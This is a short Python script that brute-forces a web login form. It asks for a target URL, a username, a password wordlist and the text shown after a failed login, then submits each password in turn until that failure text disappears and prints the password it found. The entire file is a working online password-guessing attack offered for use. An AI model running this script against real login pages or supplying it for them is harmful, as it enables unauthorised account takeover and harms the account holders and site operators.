import requests

url = input('[+] Enter page URL: ')
username = input('[+] Enter username for the account to bruteforce: ')
pw_list = input('[+] Enter password file: ')
login_fail_str = input('[+] Enter the string that appears after a failed login: ')


def cracking(user_to_crack, url_to_crack):
    for password in pw_file:
        password = password.strip()
        print('Trying password: ' + password)
        # Key names correspond to the 'name' attributes for the html elements on the webpage
        data = {'username': user_to_crack,
                'password': password,
                'Login': 'submit'}

        response = requests.post(url_to_crack, data=data)
        if login_fail_str not in response.content.decode():
            print(f'[+] Found password for user "{user_to_crack}": "{password}"')
            exit()


with open(pw_list, 'r') as pw_file:
    cracking(username, url)

print(f'[!] Password for user "{username}" not in list')
